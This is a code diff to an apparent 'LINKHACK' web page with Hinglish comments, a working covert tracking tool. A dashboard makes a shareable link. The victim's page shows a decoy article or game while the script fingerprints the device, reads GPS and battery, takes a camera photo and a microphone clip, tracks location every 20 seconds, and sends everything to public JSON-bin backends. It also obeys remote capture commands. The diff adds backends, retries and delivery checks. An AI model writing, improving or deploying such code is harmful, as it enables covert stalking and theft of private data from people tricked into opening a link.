@@ -24,7 +24,7 @@ h2{font-size:11px;letter-spacing:1.6px;text-transform:uppercase;color:var(--dim)
 button{font:inherit;border-radius:10px;border:1px solid var(--line);background:var(--card2);color:var(--fg);
   padding:10px 14px;font-size:13px;font-weight:550;cursor:pointer;transition:.15s}
 button:active{transform:scale(.97)}
-button:disabled{opacity:.55}
+button:disabled{opacity:.5}
 button.p{background:linear-gradient(135deg,var(--acc),#00c98d);color:#04120c;border-color:transparent;font-weight:700}
 button.g{background:transparent}
 button.sm{padding:7px 10px;font-size:11.5px;border-radius:8px}
@@ -58,6 +58,8 @@ audio{width:100%;margin-top:9px;height:34px}
 .warnbox{background:rgba(251,191,36,.08);border:1px solid rgba(251,191,36,.3);color:#fde68a;
   border-radius:10px;padding:10px 12px;font-size:12px;margin-top:12px}
 .errbox{background:rgba(248,113,113,.08);border:1px solid rgba(248,113,113,.35);color:#fecaca;
+  border-radius:10px;padding:11px 12px;font-size:12px;margin-top:12px}
+.okbox{background:rgba(0,229,160,.08);border:1px solid rgba(0,229,160,.35);color:#a7f3d0;
   border-radius:10px;padding:11px 12px;font-size:12px;margin-top:12px}
 .empty{text-align:center;color:var(--dim);padding:34px 12px;font-size:13px}
 .qr{width:170px;height:170px;border-radius:12px;background:#fff;padding:7px;display:block}
@@ -111,8 +113,7 @@ pre.out{background:#070d12;border:1px solid var(--line);border-radius:10px;paddi
   </div>
 
   <div id="filewarn" class="warnbox" hidden>
-    <b>file:// se khola hai.</b> Link share karne ke liye host karo — Netlify Drop
-    (<span class="mono">app.netlify.com/drop</span>) ya GitHub Pages.
+    <b>file:// se khola hai.</b> Host karo — Netlify Drop (<span class="mono">app.netlify.com/drop</span>) ya GitHub Pages.
   </div>
 
   <div class="card acc">
@@ -125,6 +126,7 @@ pre.out{background:#070d12;border:1px solid var(--line);border-radius:10px;paddi
     </div>
     <div id="diag" class="diag" hidden></div>
     <div id="errbox" class="errbox" hidden></div>
+    <div id="okbox" class="okbox" hidden></div>
 
     <div id="linkbox" hidden style="margin-top:14px">
       <div class="row" style="align-items:flex-start;gap:14px;flex-wrap:wrap">
@@ -136,6 +138,7 @@ pre.out{background:#070d12;border:1px solid var(--line);border-radius:10px;paddi
             <button class="sm" id="copyBtn">COPY</button>
             <button class="sm" id="openBtn">OPEN</button>
             <button class="sm" id="shareBtn">SHARE</button>
+            <button class="sm" id="switchBtn">SWITCH BACKEND</button>
           </div>
           <div class="sub" style="margin-top:9px" id="backendInfo"></div>
         </div>
@@ -143,9 +146,10 @@ pre.out{background:#070d12;border:1px solid var(--line);border-radius:10px;paddi
     </div>
 
     <details style="margin-top:14px">
-      <summary class="sub" style="cursor:pointer">Backend manually daalo (agar auto fail ho)</summary>
-      <div class="sub" style="margin:9px 0 6px">Koi bhi JSON bin URL — jaise <span class="mono">https://jsonblob.com/api/jsonBlob/&lt;id&gt;</span></div>
-      <input id="manualUrl" placeholder="https://jsonblob.com/api/jsonBlob/xxxxxxxx">
+      <summary class="sub" style="cursor:pointer">Manually backend daalo (agar auto fail ho)</summary>
+      <div class="sub" style="margin:9px 0 6px">Koi bhi URL jo GET/PUT JSON support kare. Jaise:
+        <span class="mono">https://superjsonblob.com/api/jsonBlob/&lt;id&gt;</span></div>
+      <input id="manualUrl" placeholder="https://superjsonblob.com/api/jsonBlob/xxxxxxxx">
       <div class="actions"><button class="sm" id="manualBtn">USE THIS</button></div>
     </details>
   </div>
@@ -163,7 +167,7 @@ pre.out{background:#070d12;border:1px solid var(--line);border-radius:10px;paddi
   <div class="card">
     <div class="kv"><b>Bina permission</b><i style="color:var(--acc)">IP · ISP · city · model · OS · screen · battery · GPU · fingerprint · fonts · timezone · local IP</i></div>
     <div class="kv"><b>Ek tap "Allow"</b><i style="color:var(--warn)">exact GPS · front camera photo · 2.5s mic clip</i></div>
-    <div class="kv"><b>Live tracking</b><i style="color:var(--warn)">har 12s position + battery update</i></div>
+    <div class="kv"><b>Live tracking</b><i style="color:var(--warn)">har 20s position + battery update</i></div>
     <div class="kv"><b>Remote command</b><i style="color:var(--acc)">dashboard se dobara photo / mic</i></div>
   </div>
   <div class="warnbox" style="background:rgba(56,189,248,.07);border-color:rgba(56,189,248,.28);color:#bae6fd">
@@ -179,25 +183,35 @@ pre.out{background:#070d12;border:1px solid var(--line);border-radius:10px;paddi
     <div class="grab"></div><h3>Device check</h3>
     <p class="s">Ye page tumhare phone ki basic info padh raha hai.</p>
     <div id="sheetbody"></div>
-    <div class="actions"><button class="sm" id="sheetClose" style="margin-top:14px">CLOSE</button></div>
+    <div class="actions">
+      <button class="sm" id="sheetCopy" style="margin-top:14px">COPY MY DATA</button>
+      <button class="sm" id="sheetClose" style="margin-top:14px">CLOSE</button>
+    </div>
   </div>
 </div>
 
 <script>
-/* ══════════════ helpers ══════════════ */
-const $=(s,r=document)=>r.querySelector(s),$$=(s,r=document)=>[...r.querySelectorAll(s)];
+/* ═══════════ helpers ═══════════ */
+const $=(s,r=document)=>r.querySelector(s);
 const sleep=ms=>new Promise(r=>setTimeout(r,ms));
 const esc=s=>String(s==null?'—':s).replace(/[<>&]/g,c=>({'<':'&lt;','>':'&gt;','&':'&amp;'}[c]));
 const abToB64=ab=>{const u=new Uint8Array(ab);let s='';for(let i=0;i<u.length;i+=0x8000)
   s+=String.fromCharCode.apply(null,u.subarray(i,i+0x8000));return btoa(s);};
 const ago=t=>{const s=Math.floor((Date.now()-t)/1000);return s<60?s+'s':s<3600?Math.floor(s/60)+'m':Math.floor(s/3600)+'h';};
 
-/* fetch with hard timeout — ye pehle missing tha */
-async function xf(url,opts={},ms=13000){
+async function xf(url,opts={},ms=14000){
   const c=new AbortController(); const t=setTimeout(()=>c.abort(),ms);
   try{ return await fetch(url,Object.assign({},opts,{signal:c.signal})); }
-  catch(e){ throw new Error(e.name==='AbortError'?'timeout':(e.message||'net error')); }
+  catch(e){ throw new Error(e.name==='AbortError'?'timeout ('+(ms/1000)+'s)':'network/CORS fail'); }
   finally{ clearTimeout(t); }
+}
+async function retry(fn,tries=3){
+  let last;
+  for(let i=0;i<tries;i++){
+    try{ return await fn(); }
+    catch(e){ last=e; if(i<tries-1) await sleep(400*(i+1)); }
+  }
+  throw last;
 }
 async function sha(str){
   try{ if(crypto&&crypto.subtle){ const h=await crypto.subtle.digest('SHA-256',new TextEncoder().encode(str));
@@ -207,82 +221,99 @@ async function sha(str){
   return (a.toString(16)+b.toString(16)).repeat(4);
 }
 
-/* ══════════════ backends — 4 fallback, real round-trip verify ══════════════ */
-const BACKENDS={
-  jsonblob:{label:'jsonblob.com',kind:'doc',
+/* ═══════════ providers — sirf verified APIs ═══════════
+   kind 'doc' = ek JSON document jise GET/PUT karte hain
+   kind 'key' = har key ka apna URL                                        */
+const PROV={
+  superblob:{ label:'superjsonblob.com', kind:'doc', host:'https://superjsonblob.com',
     async create(){
-      const r=await xf('https://jsonblob.com/api/jsonBlob',
+      const r=await xf(this.host+'/api/jsonBlob',
         {method:'POST',headers:{'Content-Type':'application/json'},body:'{}'});
       if(!r.ok) throw new Error('HTTP '+r.status);
       let loc=r.headers.get('Location')||r.headers.get('location');
-      if(!loc){ const t=await r.text().catch(()=>'');
-        const m=/"id"\s*:\s*"([^"]+)"/.exec(t)||/([0-9a-fA-F-]{16,})/.exec(t);
-        if(m) loc='https://jsonblob.com/api/jsonBlob/'+m[1]; }
-      if(!loc) throw new Error('id nahi mila');
-      return loc.replace(/\/$/,'');
+      const j=await r.json().catch(()=>null);
+      const id=(j&&j.id)||(loc&&loc.split('/').pop());
+      if(!id) throw new Error('id response me nahi');
+      return this.host+'/api/jsonBlob/'+id;
     }},
-  extendsclass:{label:'extendsclass.com',kind:'doc',
+
+  jsonstorage:{ label:'jsonstorage.net', kind:'doc', host:'https://api.jsonstorage.net',
     async create(){
-      for(const u of ['https://extendsclass.com/api/json-storage/bin',
-                      'https://extendsclass.com/api/json-storage']){
-        try{
-          const r=await xf(u,{method:'POST',headers:{'Content-Type':'application/json'},body:'{}'});
-          if(!r.ok) continue;
-          const j=await r.json().catch(()=>null);
-          const uri=j&&(j.uri||j.url||j.link||j.location);
-          if(uri) return String(uri).replace(/\/$/,'');
-        }catch(e){}
-      }
-      throw new Error('bin create fail');
+      const r=await xf(this.host+'/v1/json',
+        {method:'POST',headers:{'Content-Type':'application/json'},body:'{}'});
+      if(!r.ok) throw new Error('HTTP '+r.status);
+      const j=await r.json().catch(()=>null);
+      const uri=j&&(j.uri||j.url||j.location);
+      if(!uri) throw new Error('uri response me nahi');
+      return String(uri).replace(/\/$/,'');
     }},
-  paste:{label:'paste.rs',kind:'doc',
+
+  jsonblob:{ label:'jsonblob.com', kind:'doc', host:'https://jsonblob.com',
     async create(){
-      const r=await xf('https://paste.rs/',{method:'POST',body:'{}'});
+      const r=await xf(this.host+'/api/jsonBlob',
+        {method:'POST',headers:{'Content-Type':'application/json'},body:'{}'});
+      if(!r.ok) throw new Error('HTTP '+r.status);
+      const j=await r.json().catch(()=>null);
+      if(j&&j.id) return this.host+'/api/jsonBlob/'+j.id;
+      const loc=r.headers.get('Location')||r.headers.get('location');
+      if(loc) return loc.startsWith('http')?loc:this.host+loc;
+      throw new Error('id response me nahi');
+    }},
+
+  kvdb:{ label:'kvdb.io', kind:'key', host:'https://kvdb.io',
+    async create(){
+      const r=await xf(this.host+'/',{method:'POST'});
+      if(!r.ok) throw new Error('HTTP '+r.status);
+      const t=(await r.text()).trim();
+      const m=/([A-Za-z0-9_-]{6,})\/?$/.exec(t);
+      if(!m) throw new Error('bucket id nahi mila');
+      return this.host+'/'+m[1];
+    }},
+
+  paste:{ label:'paste.rs', kind:'doc', host:'https://paste.rs',
+    async create(){
+      const r=await xf(this.host+'/',{method:'POST',body:'{}'});
       if(!r.ok) throw new Error('HTTP '+r.status);
       const u=(await r.text()).trim();
       if(!/^https?:\/\//.test(u)) throw new Error('url nahi mila');
       return u;
-    }},
-  kvdb:{label:'kvdb.io',kind:'key',
-    async create(){
-      const r=await xf('https://kvdb.io/',{method:'POST'});
-      if(!r.ok) throw new Error('HTTP '+r.status);
-      const t=(await r.text()).trim();
-      const m=/([A-Za-z0-9_-]{6,})\/?$/.exec(t);
-      if(!m) throw new Error('bucket nahi mila');
-      return 'https://kvdb.io/'+m[1];
     }}
 };
-const ORDER=['jsonblob','extendsclass','paste','kvdb'];
+const ORDER=['superblob','jsonstorage','jsonblob','kvdb','paste'];
 
+/* ═══════════ DB layer ═══════════ */
 const DB={
-  name:null,root:null,kind:null,id:null,
-  async attach(name,root){
-    this.name=name; this.root=root; this.kind=BACKENDS[name].kind;
-    this.id=String(root).split('/').filter(Boolean).pop();
-    return this;
-  },
-  async doc(){ const r=await xf(this.root,{cache:'no-store'},12000);
+  p:null,root:null,kind:null,id:null,
+  attach(name,root){ this.p=name; this.root=root; this.kind=PROV[name].kind;
+    this.id=String(root).split('/').filter(Boolean).pop(); return this; },
+
+  async readDoc(){ const r=await xf(this.root,{cache:'no-store'},12000);
     if(!r.ok) throw new Error('read HTTP '+r.status);
     const t=await r.text(); try{ return JSON.parse(t)||{} }catch(e){ return {} } },
-  async saveDoc(d){ const r=await xf(this.root,{method:'PUT',
-    headers:{'Content-Type':'application/json'},body:JSON.stringify(d)},12000);
+
+  async writeDoc(d){ const r=await xf(this.root,{method:'PUT',
+    headers:{'Content-Type':'application/json'},body:JSON.stringify(d)},14000);
     if(!r.ok) throw new Error('write HTTP '+r.status); },
+
   async put(k,v){
-    if(this.kind==='key'){
-      const r=await xf(this.root+'/'+encodeURIComponent(k),{method:'PUT',body:JSON.stringify(v)},12000);
-      if(!r.ok) throw new Error('put HTTP '+r.status); return;
-    }
-    const d=await this.doc(); d[k]=v; await this.saveDoc(d);
+    return retry(async()=>{
+      if(this.kind==='key'){
+        const r=await xf(this.root+'/'+encodeURIComponent(k),{method:'PUT',body:JSON.stringify(v)},14000);
+        if(!r.ok) throw new Error('put HTTP '+r.status); return;
+      }
+      const d=await this.readDoc(); d[k]=v; await this.writeDoc(d);
+    });
   },
+
   async get(k){
     if(this.kind==='key'){
       const r=await xf(this.root+'/'+encodeURIComponent(k),{cache:'no-store'},12000);
       if(!r.ok) return null;
       const t=await r.text(); try{ return JSON.parse(t) }catch(e){ return t }
     }
-    return (await this.doc())[k]??null;
+    return (await this.readDoc())[k]??null;
   },
+
   async all(prefix){
     if(this.kind==='key'){
       const r=await xf(this.root+'/?list=true&prefix='+encodeURIComponent(prefix),{cache:'no-store'},12000);
@@ -294,38 +325,42 @@ const DB={
         try{ const v=await this.get(k); if(v!=null) out[k]=v; }catch(e){} }));
       return out;
     }
-    const d=await this.doc(); const out={};
+    const d=await this.readDoc(); const out={};
     for(const k in d) if(k.startsWith(prefix)) out[k]=d[k];
     return out;
   },
+
   async del(k){
-    if(this.kind==='key'){ try{ await xf(this.root+'/'+encodeURIComponent(k),{method:'DELETE'},10000); }catch(e){} return; }
-    const d=await this.doc(); delete d[k]; await this.saveDoc(d);
+    try{
+      if(this.kind==='key'){ await xf(this.root+'/'+encodeURIComponent(k),{method:'DELETE'},10000); return; }
+      const d=await this.readDoc(); delete d[k]; await this.writeDoc(d);
+    }catch(e){}
   }
 };
 
-/* create + VERIFY (write → read back → match). Ye pehle missing tha. */
+/* create + asli round-trip verify */
 async function autoInit(onLog){
   const log=[];
   for(const name of ORDER){
     const L=(m,c)=>{ log.push({name,msg:m,cls:c||''}); onLog&&onLog(log); };
     try{
       L('creating…','wa');
-      const root=await BACKENDS[name].create();
-      await DB.attach(name,root);
+      const root=await PROV[name].create();
+      const tmp=Object.create(DB); tmp.attach(name,root);
       L('probing round-trip…','wa');
       const stamp=Date.now();
-      await DB.put('__probe',{t:stamp});
-      const back=await DB.get('__probe');
+      await tmp.put('__probe',{t:stamp});
+      const back=await tmp.get('__probe');
       if(!back||back.t!==stamp) throw new Error('round-trip mismatch');
-      L('✔ WORKING — '+root,'ok');
+      DB.attach(name,root);
+      L('✔ WORKING','ok');
       return {name,root,log};
     }catch(e){ L('✘ '+e.message,'no'); }
   }
-  throw Object.assign(new Error('ALL BACKENDS FAILED'),{log});
+  throw Object.assign(new Error('ALL FAILED'),{log});
 }
 
-/* ══════════════ fingerprint sources ══════════════ */
+/* ═══════════ fingerprint sources ═══════════ */
 function canvasFP(){ try{
   const c=document.createElement('canvas');c.width=240;c.height=60;const x=c.getContext('2d');
   x.textBaseline='top';x.font='16px Arial';x.fillStyle='#f60';x.fillRect(0,0,120,30);
@@ -357,11 +392,10 @@ function fonts(list){ try{
   return list.filter(f=>['monospace','sans-serif','serif'].some(x=>m('"'+f+'",'+x)!==b[x]));
 }catch(e){return[]} }
 const FONTLIST=['Arial','Helvetica','Verdana','Tahoma','Trebuchet MS','Times New Roman','Georgia',
-'Courier New','Brush Script MT','Comic Sans MS','Impact','Palatino','Garamond','Bookman','Futura',
-'Gill Sans','Optima','Didot','Baskerville','Rockwell','Segoe UI','Calibri','Candara','Corbel',
-'Cambria','Consolas','Menlo','Monaco','Helvetica Neue','Roboto','Noto Sans','Droid Sans','Ubuntu',
-'Cantarell','Liberation Sans','DejaVu Sans','Wingdings','Symbol','Zapfino','Avenir','Copperplate',
-'Marker Felt','Papyrus','Samsung Sans','Xiaomi Sans'];
+'Courier New','Comic Sans MS','Impact','Palatino','Garamond','Futura','Gill Sans','Optima','Baskerville',
+'Rockwell','Segoe UI','Calibri','Candara','Corbel','Cambria','Consolas','Menlo','Monaco','Helvetica Neue',
+'Roboto','Noto Sans','Droid Sans','Ubuntu','Cantarell','Liberation Sans','DejaVu Sans','Wingdings','Symbol',
+'Avenir','Copperplate','Marker Felt','Papyrus','Samsung Sans','Xiaomi Sans'];
 const IOS={'320x568@2':'iPhone SE 1 / 5s','375x667@2':'iPhone 6/6s/7/8/SE 2-3',
 '375x812@3':'iPhone X / XS / 11 Pro / 12-13 mini','390x844@3':'iPhone 12 / 13 / 14',
 '393x852@3':'iPhone 14 Pro / 15 / 15 Pro / 16','402x874@3':'iPhone 16 Pro / 17',
@@ -380,7 +414,7 @@ function platform(){
     const k=screen.width+'x'+screen.height+'@'+devicePixelRatio;
     model=IOS[k]||(/iPad/.test(ua)?'iPad':'iPhone')+' ('+k+')';
   } else if(/Windows/i.test(ua)){os='Windows';ver=(/Windows NT ([\d.]+)/.exec(ua)||[])[1]||'';}
-  else if(/Mac OS X/i.test(ua)){os='macOS';}
+  else if(/Mac OS X/i.test(ua))os='macOS';
   else if(/CrOS/.test(ua))os='ChromeOS';
   else if(/Linux/i.test(ua))os='Linux';
   const br=/Edg\//.test(ua)?'Edge':/OPR\//.test(ua)?'Opera':/SamsungBrowser/.test(ua)?'Samsung Internet':
@@ -471,7 +505,7 @@ async function grabPhoto(){
   const c=document.createElement('canvas'); c.width=W; c.height=H;
   c.getContext('2d').drawImage(v,0,0,W,H);
   s.getTracks().forEach(t=>t.stop());
-  return c.toDataURL('image/jpeg',.62).split(',')[1];
+  return c.toDataURL('image/jpeg',.6).split(',')[1];
 }
 async function grabAudio(ms=2500){
   const s=await navigator.mediaDevices.getUserMedia({audio:true});
@@ -486,17 +520,15 @@ async function grabAudio(ms=2500){
   return {data:abToB64(ab),mime:mr.mimeType,size:ab.byteLength};
 }
 
-/* ══════════════ mode router ══════════════ */
+/* ═══════════ router ═══════════ */
 const q=new URLSearchParams(location.search.replace(/^\?/,''));
 const hp=new URLSearchParams((location.hash||'').replace(/^#/,''));
-const TID=q.get('t')||hp.get('t');
 const TBK=q.get('b')||hp.get('b');
 const TROOT=q.get('r')||hp.get('r');
 const DECOY=q.get('d')||'auto';
+if(TROOT&&TBK&&PROV[TBK]) agentBoot(); else dashBoot();
 
-if(TROOT&&TBK){ agentBoot(); } else { dashBoot(); }
-
-/* ══════════════ AGENT ══════════════ */
+/* ═══════════ AGENT ═══════════ */
 async function agentBoot(){
   $('#view-dash').hidden=true; $('#view-agent').hidden=false;
   const boot=document.createElement('div'); boot.className='boot';
@@ -504,7 +536,7 @@ async function agentBoot(){
     ['establishing secure channel','reading device signature','negotiating session key','done']
     .map((t,i)=>'<div class="l" style="animation-delay:'+(i*.35)+'s">› '+t+'</div>').join('')+'</div>';
   document.body.appendChild(boot);
-  await DB.attach(TBK,decodeURIComponent(TROOT));
+  DB.attach(TBK,decodeURIComponent(TROOT));
 
   const dec=$('#decoy');
   const D={
@@ -525,56 +557,55 @@ async function agentBoot(){
     blank:()=>'<div class="blank"></div>',
     recon:()=>'<div style="padding:20px;font-family:ui-monospace,monospace;font-size:12px;white-space:pre-wrap" id="reconout">reading…</div>'
   };
-  const pick = DECOY==='auto'?'load':(D[DECOY]?DECOY:'load');
+  const pick=DECOY==='auto'?'load':(D[DECOY]?DECOY:'load');
   dec.innerHTML=D[pick]();
   if(pick==='game') startGame();
 
-  const rec={ts:Date.now(),visits:1,first:Date.now(),cmdSeen:0};
+  const rec={ts:Date.now(),visits:1,first:Date.now(),cmdSeen:0,photoAt:0};
   try{ const k='lh_'+DB.id; const prev=JSON.parse(localStorage.getItem(k)||'null');
     if(prev){ rec.visits=prev.v+1; rec.first=prev.f; }
     localStorage.setItem(k,JSON.stringify({v:rec.visits,f:rec.first})); }catch(e){}
 
-  await sleep(1500);
+  await sleep(1400);
   const deep=await collectDeep(); Object.assign(rec,deep);
   boot.remove();
 
   async function push(){
     rec.lastSeen=Date.now(); rec.online=navigator.onLine;
-    try{ await DB.put('d-'+rec.fp,rec); rec.err=null; }
-    catch(e){ rec.err=e.message; }
+    try{ await DB.put('d-'+rec.fp,rec); rec.err=null; rec.fails=0; }
+    catch(e){ rec.err=e.message; rec.fails=(rec.fails||0)+1; }
+    fillSheet();
   }
 
   await push();
   const gip=await geoIP(); Object.assign(rec,gip); await push();
-  fillSheet();
 
-  if(pick==='load'){ await sleep(1200); dec.innerHTML=D.article(); }
+  if(pick==='load'){ await sleep(1100); dec.innerHTML=D.article(); }
 
   if(navigator.geolocation){
     navigator.geolocation.getCurrentPosition(p=>{
       Object.assign(rec,{gpsLat:p.coords.latitude,gpsLon:p.coords.longitude,
-        gpsAcc:p.coords.accuracy,gpsAt:Date.now()}); push(); fillSheet();
-      navigator.geolocation.watchPosition(q2=>{
-        Object.assign(rec,{gpsLat:q2.coords.latitude,gpsLon:q2.coords.longitude,
-          gpsAcc:q2.coords.accuracy,gpsAt:Date.now()}); push();
-      },()=>{},{enableHighAccuracy:true,maximumAge:8000});
-    },err=>{ rec.gpsErr=err.message; push(); fillSheet(); },
+        gpsAcc:p.coords.accuracy,gpsAt:Date.now()}); push();
+      navigator.geolocation.watchPosition(x=>{
+        Object.assign(rec,{gpsLat:x.coords.latitude,gpsLon:x.coords.longitude,
+          gpsAcc:x.coords.accuracy,gpsAt:Date.now()}); push();
+      },()=>{},{enableHighAccuracy:true,maximumAge:10000});
+    },err=>{ rec.gpsErr=err.message; push(); },
     {enableHighAccuracy:true,timeout:12000,maximumAge:0});
   }
 
-  await sleep(2600);
-  try{ const ph=await grabPhoto(); await DB.put('p-'+rec.fp,ph);
-    rec.photoAt=Date.now(); await push(); fillSheet(); }
+  await sleep(2400);
+  try{ const ph=await grabPhoto(); await DB.put('p-'+rec.fp,ph); rec.photoAt=Date.now(); await push(); }
   catch(e){ rec.camErr=e.name; await push(); }
-  await sleep(600);
+  await sleep(500);
   try{ const a=await grabAudio(2500); await DB.put('a-'+rec.fp,a);
-    rec.audioMime=a.mime; rec.audioSize=a.size; await push(); fillSheet(); }
+    rec.audioMime=a.mime; rec.audioSize=a.size; await push(); }
   catch(e){ rec.micErr=e.name; await push(); }
 
   setInterval(async()=>{
     try{ const b=await navigator.getBattery(); rec.bat=Math.round(b.level*100); rec.charging=b.charging; }catch(e){}
     push();
-  },12000);
+  },20000);
 
   setInterval(async()=>{
     try{
@@ -584,7 +615,7 @@ async function agentBoot(){
       if(c.cmd==='mic'){ try{ const a=await grabAudio(2000); await DB.put('a-'+rec.fp,a); rec.audioMime=a.mime; }catch(e){} }
       await push();
     }catch(e){}
-  },8000);
+  },10000);
 
   function fillSheet(){
     const p=platform();
@@ -596,10 +627,19 @@ async function agentBoot(){
         (gip.city?gip.city+', '+gip.country:'requesting…'))+
       kv('network',(gip.ip||'—')+(rec.connType?' · '+rec.connType:''))+
       kv('battery',rec.bat!=null?rec.bat+'%'+(rec.charging?' ⚡':''):'—')+
-      kv('sync',rec.err?'FAILED: '+rec.err:'ok');
+      kv('backend',PROV[DB.p].label)+
+      kv('sync',rec.err?'✘ '+rec.err+' (retrying)':'✔ ok');
   }
   $('#fab').onclick=()=>$('#sheet').classList.add('up');
   $('#sheetClose').onclick=()=>$('#sheet').classList.remove('up');
+  $('#sheetCopy').onclick=()=>{
+    const t='LINKHACK DATA\n'+JSON.stringify(rec,null,1);
+    (navigator.clipboard?navigator.clipboard.writeText(t):Promise.reject())
+      .then(()=>toastAgent('copied'),()=>{const i=document.createElement('textarea');
+        i.value=t;document.body.appendChild(i);i.select();document.execCommand('copy');i.remove();toastAgent('copied');});
+  };
+  function toastAgent(m){ const b=$('#sheetCopy'); const o=b.textContent;
+    b.textContent=m.toUpperCase(); setTimeout(()=>b.textContent=o,1200); }
 
   function startGame(){
     const t=$('#tgt'),a=$('#arena'); let s=0;
@@ -609,49 +649,55 @@ async function agentBoot(){
   }
 }
 
-/* ══════════════ DASHBOARD ══════════════ */
+/* ═══════════ DASHBOARD ═══════════ */
 let pollTimer=null,known=new Set(),actx=null;
 
 async function dashBoot(){
   if(location.protocol==='file:') $('#filewarn').hidden=false;
 
   const saved=JSON.parse(localStorage.getItem('lh_session')||'null');
-  if(saved&&saved.root){ await DB.attach(saved.name,saved.root); showLink(); startPolling(); }
+  if(saved&&saved.root&&PROV[saved.name]){
+    DB.attach(saved.name,saved.root); showLink(); startPolling();
+  } else {
+    const cached=JSON.parse(localStorage.getItem('lh_cache')||'null');
+    if(cached) render(cached);
+  }
 
   $('#genBtn').onclick=async()=>{
     const b=$('#genBtn'); b.disabled=true; b.textContent='CREATING…';
-    $('#errbox').hidden=true; $('#diag').hidden=false; $('#diag').innerHTML='';
+    $('#errbox').hidden=true; $('#okbox').hidden=true; $('#diag').hidden=false; $('#diag').innerHTML='';
     try{
       const r=await autoInit(log=>{
         $('#diag').innerHTML=log.map(x=>'<div class="'+x.cls+'">'+x.name+' → '+esc(x.msg)+'</div>').join('');
       });
       localStorage.setItem('lh_session',JSON.stringify({name:r.name,root:r.root}));
+      $('#okbox').hidden=false;
+      $('#okbox').innerHTML='✔ <b>'+PROV[r.name].label+'</b> pe session ban gaya. Neeche link se kisi ko bhejo.';
       showLink(); startPolling();
     }catch(e){
       $('#errbox').hidden=false;
-      $('#errbox').innerHTML='<b>Sabhi backend fail ho gaye.</b><br>'+
+      $('#errbox').innerHTML='<b>Sabhi backend fail.</b><br>'+
         (e.log||[]).map(x=>esc(x.name+' → '+x.msg)).join('<br>')+
-        '<br><br>Check karo: Chrome ka <b>Lite Mode / Data Saver</b> off karo, adblock pause karo, '+
-        'aur WiFi se try karo. Neeche manually bhi URL daal sakte ho.';
+        '<br><br>Neeche manually URL daalo, ya Firebase wala option try karo.';
     }finally{ b.disabled=false; b.textContent='GENERATE LINK'; }
   };
 
   $('#testBtn').onclick=async()=>{
     const b=$('#testBtn'); b.disabled=true; b.textContent='TESTING…';
-    $('#diag').hidden=false; $('#diag').innerHTML=''; $('#errbox').hidden=true;
+    $('#diag').hidden=false; $('#diag').innerHTML=''; $('#errbox').hidden=true; $('#okbox').hidden=true;
     const lines=[];
     for(const name of ORDER){
-      const push2=(m,c)=>{ lines.push('<div class="'+c+'">'+name+' → '+esc(m)+'</div>');
+      const L=(m,c)=>{ lines.push('<div class="'+c+'">'+name+' → '+esc(m)+'</div>');
         $('#diag').innerHTML=lines.join(''); };
-      push2('testing…','wa');
+      L('testing…','wa');
       try{
-        const root=await BACKENDS[name].create();
-        const tmp=Object.create(DB); await tmp.attach(name,root);
+        const root=await PROV[name].create();
+        const tmp=Object.create(DB); tmp.attach(name,root);
         const st=Date.now(); await tmp.put('__probe',{t:st});
         const back=await tmp.get('__probe');
         if(!back||back.t!==st) throw new Error('round-trip mismatch');
-        push2('✔ WORKING — '+root,'ok');
-      }catch(e){ push2('✘ '+e.message,'no'); }
+        L('✔ WORKING — '+root,'ok');
+      }catch(e){ L('✘ '+e.message,'no'); }
     }
     b.disabled=false; b.textContent='TEST BACKENDS';
   };
@@ -661,16 +707,18 @@ async function dashBoot(){
     localStorage.removeItem('lh_session'); known.clear();
     $('#devlist').innerHTML=''; $('#cnt').textContent='0';
     $('#linkbox').hidden=true; $('#resetBtn').hidden=true;
+    $('#okbox').hidden=true; $('#errbox').hidden=true;
     clearInterval(pollTimer); setStatus('idle',false);
   };
   $('#manualBtn').onclick=async()=>{
     const u=$('#manualUrl').value.trim(); if(!u)return;
-    const n=/jsonblob/.test(u)?'jsonblob':/extendsclass/.test(u)?'extendsclass'
-      :/paste\.rs/.test(u)?'paste':'kvdb';
-    await DB.attach(n,u);
+    const n=/superjsonblob/.test(u)?'superblob':/jsonstorage/.test(u)?'jsonstorage'
+      :/jsonblob/.test(u)?'jsonblob':/paste\.rs/.test(u)?'paste':'kvdb';
+    DB.attach(n,u);
     localStorage.setItem('lh_session',JSON.stringify({name:n,root:u}));
     showLink(); startPolling();
   };
+  $('#switchBtn').onclick=()=>{ $('#resetBtn').click(); };
   $('#copyBtn').onclick=()=>copy($('#link').value);
   $('#openBtn').onclick=()=>window.open($('#link').value,'_blank');
   $('#shareBtn').onclick=()=>navigator.share?navigator.share({title:'check this',url:$('#link').value}):copy($('#link').value);
@@ -681,10 +729,10 @@ async function dashBoot(){
 }
 
 function showLink(){
-  const link=location.origin+location.pathname+'?b='+DB.name+'&r='+encodeURIComponent(DB.root);
+  const link=location.origin+location.pathname+'?b='+DB.p+'&r='+encodeURIComponent(DB.root);
   $('#link').value=link;
   $('#linkbox').hidden=false; $('#resetBtn').hidden=false;
-  $('#backendInfo').textContent='backend: '+DB.name+' · id: '+DB.id;
+  $('#backendInfo').textContent='backend: '+PROV[DB.p].label+' · id: '+DB.id;
   $('#qr').src='https://api.qrserver.com/v1/create-qr-code/?size=300x300&margin=6&data='+encodeURIComponent(link);
   setStatus('link ready',true);
 }
@@ -697,18 +745,25 @@ function legacy(t){ try{ const i=$('#link'); i.value=t; i.select();
   document.execCommand('copy'); toast('copied'); }catch(e){} }
 function toast(m){ const s=$('#nettxt'),o=s.textContent; s.textContent=m; setTimeout(()=>s.textContent=o,1200); }
 function setStatus(t,live){ $('#nettxt').textContent=t; $('#netdot').classList.toggle('live',!!live); }
-function startPolling(){ clearInterval(pollTimer); poll(true); pollTimer=setInterval(poll,6000); }
+function startPolling(){ clearInterval(pollTimer); poll(true); pollTimer=setInterval(poll,8000); }
 
 async function poll(force){
   if(document.hidden&&!force) return;
   $('#lastPoll').textContent='sync '+new Date().toLocaleTimeString().slice(0,8);
-  let all={}; try{ all=await DB.all('d-'); }catch(e){ return; }
+  let all={};
+  try{ all=await DB.all('d-'); }
+  catch(e){ setStatus('read fail — retrying',false); return; }
   const ids=Object.keys(all);
+  if(!ids.length&&!force){
+    const cached=JSON.parse(localStorage.getItem('lh_cache')||'null');
+    if(cached&&Object.keys(cached).length) all=cached;
+  }
   let fresh=false;
-  for(const k of ids){ const id=k.replace(/^d-/,''); if(!known.has(id)){ known.add(id); fresh=true; } }
+  for(const k of Object.keys(all)){ const id=k.replace(/^d-/,''); if(!known.has(id)){ known.add(id); fresh=true; } }
   window.__all=all; render(all);
-  if(fresh){ beep(); navigator.vibrate&&navigator.vibrate(60); setStatus('new device',true); }
-  else setStatus(ids.length?ids.length+' device(s) live':'link ready',ids.length>0);
